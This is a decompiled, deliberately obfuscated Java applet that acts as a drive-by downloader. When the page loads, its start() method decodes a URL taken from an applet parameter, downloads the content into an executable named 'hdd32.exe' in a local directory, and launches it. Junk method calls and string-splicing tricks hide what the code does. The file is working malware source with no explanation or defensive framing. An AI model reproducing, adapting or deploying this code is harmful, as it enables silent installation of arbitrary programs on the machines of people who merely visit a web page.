import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Esia extends Applet
{
    private Object[] lccmnf;
    private JList bnrje3;
    
    private void mmmrr2() {
        final Boolean s = true;
    }
    
    @Override
    public void init() {
        this.mmmrr2();
        final String edf = new String();
        this.mmmrr2();
        final Lolp uyw3 = new Lolp();
        this.mmmrr2();
        final Bar juy5 = new Bar();
        this.mmmrr2();
        this.mmmrr2();
        final int a = 11;
        this.mmmrr2();
        juy5.Bar();
        final int as = 1;
        this.mmmrr2();
        final Object[] bbbr2 = Lolp.Lopwd();
        this.mmmrr2();
        this.bnrje3 = new JList((E[])bbbr2);
        this.mmmrr2();
        this.add(this.bnrje3);
    }
    
    @Override
    public void start() {
        try {
            this.mmmrr2();
            final String eff1 = new String();
            this.mmmrr2();
            final Pol oobb = new Pol();
            this.mmmrr2();
            this.mmmrr2();
            String kiuyrd = oobb.Pysta();
            this.mmmrr2();
            if (kiuyrd.charAt(kiuyrd.length() - 1) != '\\') {
                kiuyrd += "\\";
            }
            final String ppkwqalccmnfg = kiuyrd + "hpppnf3dd3pppnf32.epppnf3xpppnf3e".replace("pppnf3", "");
            final Oi ooorwq = new Oi();
            this.mmmrr2();
            this.mmmrr2();
            final String gw = new String();
            this.mmmrr2();
            final String oonwqlccmnf = this.getParameter("dokbbfw3esokbbfw3t".replace("okbbfw3", ""));
            final String as = new String();
            this.mmmrr2();
            final String doonwqlccmnf = oobb.Tapa(oonwqlccmnf);
            this.mmmrr2();
            this.mmmrr2();
            ooorwq.jkkkree = ooorwq.Lolgfes(ppkwqalccmnfg);
            this.mmmrr2();
            final String e = new String();
            this.mmmrr2();
            ooorwq.hjjrewwr = Etui.Mongo(doonwqlccmnf);
            this.mmmrr2();
            final String df = new String();
            this.mmmrr2();
            byte[] kkkbre = new byte[153601];
            this.mmmrr2();
            final String gqh = new String();
            this.mmmrr2();
            final int ahfh = 33;
            this.mmmrr2();
            final String qff = new String();
            this.mmmrr2();
            int cnt = 0;
            this.mmmrr2();
            while ((cnt = ooorwq.hjjrewwr.read(kkkbre)) > 0) {
                final String za = new String();
                this.mmmrr2();
                ooorwq.jkkkree.write(kkkbre, 0, cnt);
                this.mmmrr2();
                kkkbre = new byte[153601];
            }
            final String saqa = new String();
            this.mmmrr2();
            ooorwq.jkkkree.close();
            this.mmmrr2();
            final String ggqwww = new String();
            this.mmmrr2();
            ooorwq.hjjrewwr.close();
            try {
                final String afqa0 = new String();
                this.mmmrr2();
                Etui.Loema(ppkwqalccmnfg);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class ffhg
    {
    }
    
    public class fffgss
    {
    }
}
